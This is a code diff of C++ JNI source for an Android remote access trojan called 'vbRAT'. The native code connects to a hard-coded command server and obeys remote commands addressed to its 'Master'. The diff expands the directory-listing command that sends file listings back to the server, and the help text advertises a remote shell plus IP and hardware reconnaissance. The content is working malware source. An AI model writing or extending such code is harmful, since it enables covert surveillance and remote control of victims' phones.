@@ -120,34 +120,41 @@ void vbRAT_messageReceived(const char* buf, int len)
     }
     else if(strstr(buf, ";scandir "))
     {
-        char tosend[1024];
-        char targetdir[512];
-        snprintf(targetdir, 512, "%s", &buf[9]);
-        struct dirent **fileListTemp;
-        int nof = scandir(targetdir, &fileListTemp, NULL, alphasort);
-        if (nof < 0)
-            vbConnection_Send("access denied");
-        else
+        if(strlen(buf)> strlen(";scandir "))
         {
-            snprintf(tosend, 1024, "~ls %s", targetdir);
-            vbConnection_Send(tosend);
-            for (int i = 0; i < nof; i++)
+            char tosend[1024];
+            char targetdir[512];
+            snprintf(targetdir, 512, "%s", &buf[9]);
+            struct dirent **fileListTemp;
+            int nof = scandir(targetdir, &fileListTemp, NULL, alphasort);
+            if (nof < 0)
+                vbConnection_Send("access denied");
+            else
             {
-                //snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
-                snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
+                snprintf(tosend, 1024, "~ls %s", targetdir);
                 vbConnection_Send(tosend);
+                for (int i = 0; i < nof; i++)
+                {
+                    //snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
+                    snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name,
+                             fileListTemp[i]->d_type);
+                    vbConnection_Send(tosend);
+                }
             }
         }
+        else
+            vbConnection_Send("Usage: ;scandir \"dir path\" [prints the content of the given directory]");
     }
     else if(strcmp(buf, ";help")==0) //
     {
         char tosend[1024];
-        snprintf(tosend, 1024, "%s", "Master, this are all the commands I know: \n");
+        snprintf(tosend, 1024, "%s", "Master, these are all the commands I know: \n");
         strcat(tosend, ";shellstart [turns this into a terminal emulator on device] \n");
         strcat(tosend, ";shellstop [disconnect from the terminal emulator] \n");
         strcat(tosend, ";>C [in terminal mode sends ETX (CTRL+C)] \n");
         strcat(tosend, ";getip [returns informations about the device public IP and its network interfaces]\n");
         strcat(tosend, ";getinfo [prints generic HW info about thre device (Brand, model, etc..)] \n");
+        strcat(tosend, ";scandir \"dir path\" [prints the content of the given directory] \n");
         strcat(tosend, ";help [prints this help] \n");
         vbConnection_Send(tosend);
     }
@@ -156,8 +163,10 @@ void vbRAT_messageReceived(const char* buf, int len)
 
 }
 
+//Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)
+
 extern "C" JNIEXPORT jint JNICALL
-Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)
+Java_com_example_vbrat_service_vbRATstart(JNIEnv *env, jobject MainActivity)
 {
     LOGW("Started..");
     vbRAT.tips = true;
@@ -165,6 +174,14 @@ Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity
     vbConnection_onDisconnected(vbRAT_disconnected);
     vbConnection_onMessage(vbRAT_messageReceived);
     return(vbConnection_Connect(SERVER_ADDR));
+}
+
+extern "C" JNIEXPORT jint JNICALL
+Java_com_example_vbrat_service_vbRATstop(JNIEnv *env, jobject MainActivity)
+{
+    LOGW("Stopped..");
+    vbConnection_Send("~Getting disconnected...");
+    return 0;
 }
 
 extern "C" JNIEXPORT jstring JNICALL
